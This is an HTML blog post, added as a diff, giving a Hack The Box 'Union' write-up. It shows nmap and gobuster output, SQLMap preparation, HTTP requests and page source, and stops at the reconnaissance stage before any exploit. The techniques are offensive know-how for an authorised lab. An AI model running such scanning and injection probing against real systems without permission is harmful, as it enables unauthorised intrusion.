@@ -1,0 +1,735 @@
+<!DOCTYPE html>
+<html lang="en-US">
+
+<head>
+  <meta http-equiv="X-Clacks-Overhead" content="GNU Terry Pratchett" />
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<link rel="shortcut icon" href="https://example.com/images/ability_poisons.jpg" />
+<title>HTB Union Write-up | Jordan&#39;s Blog</title>
+<meta name="title" content="HTB Union Write-up" />
+<meta name="description" content="A write-up for the Union box." />
+<meta name="keywords" content="HTB,Pentesting," />
+
+
+<meta property="og:url" content="https://example.com/htb-union-write-up/">
+  <meta property="og:site_name" content="Jordan&#39;s Blog">
+  <meta property="og:title" content="HTB Union Write-up">
+  <meta property="og:description" content="A write-up for the Union box.">
+  <meta property="og:locale" content="en_US">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="blog">
+    <meta property="article:published_time" content="2025-01-25T00:00:00+00:00">
+    <meta property="article:modified_time" content="2025-01-25T00:00:00+00:00">
+    <meta property="article:tag" content="HTB">
+    <meta property="article:tag" content="Pentesting">
+    <meta property="og:image" content="https://example.com/images/share.png">
+
+
+
+
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="https://example.com/images/share.png">
+  <meta name="twitter:title" content="HTB Union Write-up">
+  <meta name="twitter:description" content="A write-up for the Union box.">
+
+
+
+
+  <meta itemprop="name" content="HTB Union Write-up">
+  <meta itemprop="description" content="A write-up for the Union box.">
+  <meta itemprop="datePublished" content="2025-01-25T00:00:00+00:00">
+  <meta itemprop="dateModified" content="2025-01-25T00:00:00+00:00">
+  <meta itemprop="wordCount" content="2972">
+  <meta itemprop="image" content="https://example.com/images/share.png">
+  <meta itemprop="keywords" content="HTB,Pentesting">
+<meta name="referrer" content="no-referrer-when-downgrade" />
+
+  <style>
+  :root {
+      --width: 800px;
+      --font-main: "Courier New", monospace;
+      --font-secondary: "Courier New", monospace;
+      --font-scale: 1em;
+      --background-color: #fff;
+      --heading-color: #222;
+      --text-color: #444;
+      --link-color: #32ab60;
+      --visited-color:  #32ab60;
+      --code-background-color: #f2f2f2;
+      --code-color: #222;
+      --blockquote-color: #222;
+  }
+
+  @media (prefers-color-scheme: dark) {
+      :root {
+          --background-color: #070b0a;
+          --heading-color: #32ab60;
+          --text-color: #32ab60;
+          --link-color: #32ab60;
+          --visited-color:  #32ab60;
+          --code-background-color: #272822;
+          --code-color: #ddd;
+          --blockquote-color: #ccc;
+      }
+  }
+
+  body {
+      font-family: var(--font-secondary);
+      font-size: var(--font-scale);
+      margin: auto;
+      padding: 20px;
+      max-width: var(--width);
+      text-align: left;
+      background-color: var(--background-color);
+      word-wrap: break-word;
+      overflow-wrap: break-word;
+      white-space: normal;
+      line-height: 1.5;
+      color: var(--text-color);
+  }
+
+  h1, h2, h3, h4, h5, h6 {
+      font-family: var(--font-main);
+      color: var(--heading-color);
+  }
+
+  a {
+      color: var(--link-color);
+      cursor: pointer;
+      text-decoration: none;
+  }
+
+  a:hover {
+      text-decoration: underline; 
+  }
+
+  nav a {
+      margin-right: 8px;
+  }
+
+  strong, b {
+      color: var(--heading-color);
+  }
+
+  button {
+      margin: 0;
+      cursor: pointer;
+  }
+
+  main {
+      line-height: 1.6;
+  }
+
+  table {
+      width: 100%;
+  }
+
+  hr {
+      border: 0;
+      border-top: 1px dashed;
+  }
+
+  img {
+      max-width: 100%;
+  }
+
+  pre {
+      white-space: pre-wrap !important;
+      overflow-x: auto !important;
+      word-break: break-all !important;
+      max-width: var(--width) !important;
+      margin: 0 !important;
+  }
+
+  code {
+      font-family: "Courier New", monospace;
+      background-color: var(--code-background-color);
+      color: var(--code-color);
+      white-space: pre-wrap;
+      word-wrap: break-word;
+      overflow-wrap: break-word;
+  }
+
+  blockquote {
+      border-left: 1px solid #999;
+      color: var(--code-color);
+      padding-left: 20px;
+      font-style: italic;
+      text-wrap: wrap;
+  }
+
+  footer {
+      padding: 25px 0;
+      text-align: center;
+  }
+
+  .title:hover {
+      text-decoration: none;
+  }
+
+  .title h1 {
+      font-size: 1.5em;
+  }
+
+  .inline {
+      width: auto !important;
+  }
+
+  .highlight, .code {
+      background-color: var(--code-background-color);
+      color: var(--code-color);
+      padding: 5px 10px;
+      white-space: pre-wrap;
+      word-wrap: break-word; 
+      overflow-wrap: break-word;
+  }
+
+   
+  ul.blog-posts {
+      list-style-type: none;
+      padding: unset;
+  }
+
+  ul.blog-posts li {
+      display: flex;
+  }
+
+  ul.blog-posts li span {
+      flex: 0 0 130px;
+  }
+
+  ul.blog-posts li a:visited {
+      color: var(--visited-color);
+  }
+  .terminal-container {
+    background-color: #C0C0C0;  
+    border: 2px solid #808080;  
+    border-radius: 4px;  
+    padding: 10px;  
+    box-shadow: 3px 3px 8px rgba(0, 0, 0, 0.5);  
+    position: relative;  
+    margin: 20px auto;  
+    width: fit-content;  
+    max-width: 100%;  
+  }
+  .terminal-title-bar {
+    background-color: #000080;  
+    color: #FFFFFF;  
+    font-family: "Arial", sans-serif;  
+    font-size: 14px;  
+    padding: 5px 10px;  
+    border-bottom: 2px solid #808080;  
+    border-radius: 4px 4px 0 0;  
+    text-align: left;  
+  }
+  .terminal-codebox {
+    background-color: #000000;  
+    color: #00FF00;  
+    font-family: "Courier New", monospace;  
+    padding: 10px;  
+    overflow-x: auto;  
+    white-space: pre;  
+    border-radius: 3px;  
+    border: 1px solid #808080;  
+  }
+</style>
+
+</head>
+
+<body>
+  <header><a href="/" class="title">
+  <h2>Jordan&#39;s Blog</h2>
+</a>
+<nav><a href="/">Home</a>
+
+
+<a href="/blog">Blog</a>
+
+</nav>
+</header>
+  <main>
+
+<h1>HTB Union Write-up</h1>
+<p>
+  <i>
+    <time datetime='2025-01-25'>
+      25 Jan, 2025
+    </time>
+  </i>
+</p>
+
+<content>
+  <p>As always, starting off with our nmap scans, we do a quick and comprehensive scan.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$sudo nmap --open 10.10.11.128 -oA union_top1k                                │Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2025-01-25 10:40 EST
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>sudo<span style="color:#f92672">]</span> password <span style="color:#66d9ef">for</span> jsmooth:                                                       │
+</span></span><span style="display:flex;"><span>Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2025-01-25 10:40 EST                 │
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.11.128                                                  │
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.026s latency<span style="color:#f92672">)</span>.                                                       │
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">999</span> filtered tcp ports <span style="color:#f92672">(</span>no-response<span style="color:#f92672">)</span>                                    │
+</span></span><span style="display:flex;"><span>Some closed ports may be reported as filtered due to --defeat-rst-ratelimit        │
+</span></span><span style="display:flex;"><span>PORT   STATE SERVICE                                                               │
+</span></span><span style="display:flex;"><span>80/tcp open  http
+</span></span></code></pre></div><p>Comprehensive:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$cat tmux-screen-capture-Union-0-1-20250125T104406.log 
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.11.128
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.027s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">65534</span> filtered tcp ports <span style="color:#f92672">(</span>no-response<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>PORT   STATE SERVICE VERSION
+</span></span><span style="display:flex;"><span>80/tcp open  http    nginx 1.18.0 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| http-cookie-flags: 
+</span></span><span style="display:flex;"><span>|   /: 
+</span></span><span style="display:flex;"><span>|     PHPSESSID: 
+</span></span><span style="display:flex;"><span>|_      httponly flag not set
+</span></span><span style="display:flex;"><span>|_http-server-header: nginx/1.18.0 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_http-title: Site doesn<span style="color:#960050;background-color:#1e0010">&#39;</span>t have a title <span style="color:#f92672">(</span>text/html; charset<span style="color:#f92672">=</span>UTF-8<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Warning: OSScan results may be unreliable because we could not find at least <span style="color:#ae81ff">1</span> open and <span style="color:#ae81ff">1</span> closed port
+</span></span><span style="display:flex;"><span>Device type: general purpose
+</span></span><span style="display:flex;"><span>Running <span style="color:#f92672">(</span>JUST GUESSING<span style="color:#f92672">)</span>: Linux 5.X|4.X|2.6.X <span style="color:#f92672">(</span>97%<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>OS CPE: cpe:/o:linux:linux_kernel:5.0 cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:2.6.32
+</span></span><span style="display:flex;"><span>Aggressive OS guesses: Linux 5.0 <span style="color:#f92672">(</span>97%<span style="color:#f92672">)</span>, Linux 4.15 - 5.8 <span style="color:#f92672">(</span>90%<span style="color:#f92672">)</span>, Linux 5.0 - 5.4 <span style="color:#f92672">(</span>90%<span style="color:#f92672">)</span>, Linux 5.3 - 5.4 <span style="color:#f92672">(</span>89%<span style="color:#f92672">)</span>, Linux 2.6.32 <span style="color:#f92672">(</span>89%<span style="color:#f92672">)</span>, Linux 5.0 - 5.5 <span style="color:#f92672">(</span>88%<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>No exact OS matches <span style="color:#66d9ef">for</span> host <span style="color:#f92672">(</span>test conditions non-ideal<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Network Distance: <span style="color:#ae81ff">2</span> hops
+</span></span><span style="display:flex;"><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>TRACEROUTE <span style="color:#f92672">(</span>using port 80/tcp<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>HOP RTT      ADDRESS
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span>   28.84 ms 10.10.14.1
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">2</span>   29.04 ms 10.10.11.128
+</span></span></code></pre></div><p>Looks like a web app running on nginx on a Ubuntu box. In real life, I&rsquo;d search for nginx 1.18.0 vulnerabilities, but since this is CTF, it&rsquo;s probably not the way to go. Let&rsquo;s take a look at the website.</p>
+<p><img src="/images/Union/website.png" alt="Union site"></p>
+<p>So it looks like we can input a player&rsquo;s name. I&rsquo;m going to attempt to use the name &ldquo;test&rdquo;. Submitting a player then takes us to this page:</p>
+<p><img src="/images/Union/redirect.png" alt="Next page"></p>
+<p>This page asks us to enter the first flag.</p>
+<p><img src="/images/Union/enterflag.png" alt="Enter flag"></p>
+<p>I try entering a few different values like &ldquo;test&rdquo;, &ldquo;1234&rdquo; &ldquo;!@#$%&rdquo;, etc. Nothing happens.</p>
+<p>Let&rsquo;s try some common input validation flaws such as XSS and SQLi. On the first page, we noticed that whatever value you enter for the player is reflected on the next page. This seems like a good candidate for XSS.</p>
+<p><img src="/images/Union/xss.png" alt="XSS"></p>
+<p>This works, but a client-side vulnerability doesn&rsquo;t really get us anywhere. We try adding a single quote to see if we get a SQL error back, but don&rsquo;t get anything. Ok, let&rsquo;s try SQLMap. First we save the POST requests from Burp, and then replace the data with an asterisk to tell SQLMap that is the injection point.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#a6e22e">POST</span> /index.php <span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span>
+</span></span><span style="display:flex;"><span>Host<span style="color:#f92672">:</span> <span style="color:#ae81ff">10.10.11.128</span>
+</span></span><span style="display:flex;"><span>User-Agent<span style="color:#f92672">:</span> <span style="color:#ae81ff">Mozilla/5.0 (Windows NT 10.0; rv:128.0) Gecko/20100101 Firefox/128.0</span>
+</span></span><span style="display:flex;"><span>Accept<span style="color:#f92672">:</span> <span style="color:#ae81ff">*/*</span>
+</span></span><span style="display:flex;"><span>Accept-Language<span style="color:#f92672">:</span> <span style="color:#ae81ff">en-US,en;q=0.5</span>
+</span></span><span style="display:flex;"><span>Accept-Encoding<span style="color:#f92672">:</span> <span style="color:#ae81ff">gzip, deflate, br</span>
+</span></span><span style="display:flex;"><span>Content-Type<span style="color:#f92672">:</span> <span style="color:#ae81ff">application/x-www-form-urlencoded; charset=UTF-8</span>
+</span></span><span style="display:flex;"><span>X-Requested-With<span style="color:#f92672">:</span> <span style="color:#ae81ff">XMLHttpRequest</span>
+</span></span><span style="display:flex;"><span>Content-Length<span style="color:#f92672">:</span> <span style="color:#ae81ff">13</span>
+</span></span><span style="display:flex;"><span>Origin<span style="color:#f92672">:</span> <span style="color:#ae81ff">http://10.10.11.128</span>
+</span></span><span style="display:flex;"><span>DNT<span style="color:#f92672">:</span> <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>Connection<span style="color:#f92672">:</span> <span style="color:#ae81ff">keep-alive</span>
+</span></span><span style="display:flex;"><span>Referer<span style="color:#f92672">:</span> <span style="color:#ae81ff">http://10.10.11.128/</span>
+</span></span><span style="display:flex;"><span>Cookie<span style="color:#f92672">:</span> <span style="color:#ae81ff">PHPSESSID=glb0f525tuhgiroboobmee5hld</span>
+</span></span><span style="display:flex;"><span>Priority<span style="color:#f92672">:</span> <span style="color:#ae81ff">u=0</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>player=*
+</span></span></code></pre></div><p>SQLMap tells us both POST requests aren&rsquo;t vulnerable. Let&rsquo;s look for any other subdomains.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$gobuster dir -u http://10.10.11.128 -w /usr/share/wordlists/dirb/common.txt -x .php -t 300
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+</span></span><span style="display:flex;"><span>Gobuster v3.6                         
+</span></span><span style="display:flex;"><span>by OJ Reeves <span style="color:#f92672">(</span>@TheColonial<span style="color:#f92672">)</span> &amp; Christian Mehlmauer <span style="color:#f92672">(</span>@firefart<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Url:                     http://10.10.11.128
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Method:                  GET
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Threads:                 <span style="color:#ae81ff">300</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Wordlist:                /usr/share/wordlists/dirb/common.txt
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Negative Status codes:   <span style="color:#ae81ff">404</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> User Agent:              gobuster/3.6
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Extensions:              php
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Timeout:                 10s
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+</span></span><span style="display:flex;"><span>Starting gobuster in directory enumeration mode
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+</span></span><span style="display:flex;"><span>/.htpasswd            <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 162<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/.htaccess            <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 162<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/.hta                 <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 162<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/config.php           <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 0<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/css                  <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 178<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://10.10.11.128/css/<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/firewall.php         <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 13<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/index.php            <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 1220<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/index.php            <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 1220<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>Progress: <span style="color:#ae81ff">9228</span> / <span style="color:#ae81ff">9230</span> <span style="color:#f92672">(</span>99.98%<span style="color:#f92672">)</span>
+</span></span></code></pre></div><p>We find subdomains: firewall.php and config.php. The config.php page is empty which is interesting. The firewall.php page results in a 200 OK status, but it just says &ldquo;Access Denied&rdquo;.</p>
+<p><img src="/images/Union/access_denied.png" alt="Access denied"></p>
+<p>Maybe we can try some other HTTP methods and see if we can&rsquo;t bypass this message. Setting the OPTIONS header doesn&rsquo;t cause the page to respond with allowed options.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-HTTP" data-lang="HTTP"><span style="display:flex;"><span><span style="color:#a6e22e">OPTIONS</span> /firewall.php <span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span>
+</span></span><span style="display:flex;"><span>Host<span style="color:#f92672">:</span> <span style="color:#ae81ff">10.10.11.128</span>
+</span></span><span style="display:flex;"><span>User-Agent<span style="color:#f92672">:</span> <span style="color:#ae81ff">Mozilla/5.0 (Windows NT 10.0; rv:128.0) Gecko/20100101 Firefox/128.0</span>
+</span></span><span style="display:flex;"><span>Accept<span style="color:#f92672">:</span> <span style="color:#ae81ff">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8</span>
+</span></span><span style="display:flex;"><span>Accept-Language<span style="color:#f92672">:</span> <span style="color:#ae81ff">en-US,en;q=0.5</span>
+</span></span><span style="display:flex;"><span>Accept-Encoding<span style="color:#f92672">:</span> <span style="color:#ae81ff">gzip, deflate, br</span>
+</span></span><span style="display:flex;"><span>DNT<span style="color:#f92672">:</span> <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>Connection<span style="color:#f92672">:</span> <span style="color:#ae81ff">keep-alive</span>
+</span></span><span style="display:flex;"><span>Cookie<span style="color:#f92672">:</span> <span style="color:#ae81ff">PHPSESSID=glb0f525tuhgiroboobmee5hld</span>
+</span></span><span style="display:flex;"><span>Upgrade-Insecure-Requests<span style="color:#f92672">:</span> <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>Priority<span style="color:#f92672">:</span> <span style="color:#ae81ff">u=0, i</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-HTTP" data-lang="HTTP"><span style="display:flex;"><span><span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span> <span style="color:#ae81ff">200</span> <span style="color:#a6e22e">OK</span>
+</span></span><span style="display:flex;"><span>Server<span style="color:#f92672">:</span> <span style="color:#ae81ff">nginx/1.18.0 (Ubuntu)</span>
+</span></span><span style="display:flex;"><span>Date<span style="color:#f92672">:</span> <span style="color:#ae81ff">Sun, 26 Jan 2025 22:13:37 GMT</span>
+</span></span><span style="display:flex;"><span>Content-Type<span style="color:#f92672">:</span> <span style="color:#ae81ff">text/html; charset=UTF-8</span>
+</span></span><span style="display:flex;"><span>Connection<span style="color:#f92672">:</span> <span style="color:#ae81ff">keep-alive</span>
+</span></span><span style="display:flex;"><span>Expires<span style="color:#f92672">:</span> <span style="color:#ae81ff">Thu, 19 Nov 1981 08:52:00 GMT</span>
+</span></span><span style="display:flex;"><span>Cache-Control<span style="color:#f92672">:</span> <span style="color:#ae81ff">no-store, no-cache, must-revalidate</span>
+</span></span><span style="display:flex;"><span>Pragma<span style="color:#f92672">:</span> <span style="color:#ae81ff">no-cache</span>
+</span></span><span style="display:flex;"><span>Content-Length<span style="color:#f92672">:</span> <span style="color:#ae81ff">13</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Access Denied
+</span></span></code></pre></div><p>Trying different HTTP methods doesn&rsquo;t seem to get us anywhere. Let&rsquo;s look at the source code.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-HTML" data-lang="HTML"><span style="display:flex;"><span>&lt;<span style="color:#f92672">link</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;css/bootstrap.min.css&#34;</span> <span style="color:#a6e22e">rel</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;stylesheet&#34;</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;bootstrap-css&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">script</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;//maxcdn.bootstrapcdn.com/bootstrap/4.1.1/js/bootstrap.min.js&#34;</span>&gt;&lt;/<span style="color:#f92672">script</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">script</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js&#34;</span>&gt;&lt;/<span style="color:#f92672">script</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">script</span>&gt;
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">$</span>(<span style="color:#66d9ef">function</span> () {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">$</span>(<span style="color:#e6db74">&#39;form&#39;</span>).<span style="color:#a6e22e">on</span>(<span style="color:#e6db74">&#39;submit&#39;</span>, <span style="color:#66d9ef">function</span> (<span style="color:#a6e22e">e</span>) {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">e</span>.<span style="color:#a6e22e">preventDefault</span>();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">$</span>.<span style="color:#a6e22e">ajax</span>({
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">type</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;post&#39;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">url</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;index.php&#39;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">data</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;player=&#39;</span> <span style="color:#f92672">+</span> document.<span style="color:#a6e22e">getElementsByName</span>(<span style="color:#e6db74">&#39;player&#39;</span>)[<span style="color:#ae81ff">0</span>].<span style="color:#a6e22e">value</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">async</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">true</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">success</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">function</span> (<span style="color:#a6e22e">data</span>) {
+</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">$</span>(<span style="color:#e6db74">&#39;#output&#39;</span>).<span style="color:#a6e22e">html</span>(<span style="color:#e6db74">&#34;&#34;</span>);
+</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">$</span>(<span style="color:#e6db74">&#39;#output&#39;</span>).<span style="color:#a6e22e">append</span>(<span style="color:#a6e22e">data</span>);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>      });
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    });
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  });
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">script</span>&gt;
+</span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;!------ Include the above in your HEAD tag ----------&gt;</span>
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">div</span> &gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;container&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>        &lt;<span style="color:#f92672">h1</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text-center m-5&#34;</span>&gt;Join the UHC - November Qualifiers&lt;/<span style="color:#f92672">h1</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;/<span style="color:#f92672">div</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">section</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;bg-dark text-center p-5 mt-4&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>        &lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;container p-3&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>            &lt;<span style="color:#f92672">h3</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text-white&#34;</span>&gt;Player Eligibility Check&lt;/<span style="color:#f92672">h3</span>&gt;
+</span></span><span style="display:flex;"><span>            &lt;<span style="color:#f92672">form</span> <span style="color:#a6e22e">action</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;#&#34;</span> <span style="color:#a6e22e">method</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Post&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>                &lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text&#34;</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;player&#34;</span> <span style="color:#a6e22e">placeholder</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;player&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>                &lt;<span style="color:#f92672">button</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;submit&#34;</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;btn btn-default&#34;</span>&gt;Check&lt;<span style="color:#f92672">i</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;fa fa-envelope&#34;</span>&gt;&lt;/<span style="color:#f92672">i</span>&gt;&lt;/<span style="color:#f92672">button</span>&gt;
+</span></span><span style="display:flex;"><span>            &lt;/<span style="color:#f92672">form</span>&gt;
+</span></span><span style="display:flex;"><span>            &lt;<span style="color:#f92672">p</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text-white&#34;</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;output&#34;</span>&gt;&lt;/<span style="color:#f92672">p</span>&gt;
+</span></span><span style="display:flex;"><span>        &lt;/<span style="color:#f92672">div</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;/<span style="color:#f92672">section</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">div</span>&gt;
+</span></span></code></pre></div><p>Again, it just looks like it&rsquo;s outputting the name you enter. We already saw that the site is vulnerable to XSS, but I don&rsquo;t think that&rsquo;s useful here. So far our only option is that we can enter information on the original pages for the player and the flag parameters.</p>
+<p>Ok, so we know the box&rsquo;s name is &ldquo;Union&rdquo; which makes me immediately think of UNION-based SQL injections. We already tried SQLMap, but it would make sense that it doesn&rsquo;t work even if the site is vulnerable to SQL injection or else this box wouldn&rsquo;t be a challenge.</p>
+<p>We know that the site looks like it is just reflecting whatever we enter, but maybe it is adding it to a table? Let&rsquo;s try adding an absurd name that would never be in the database.</p>
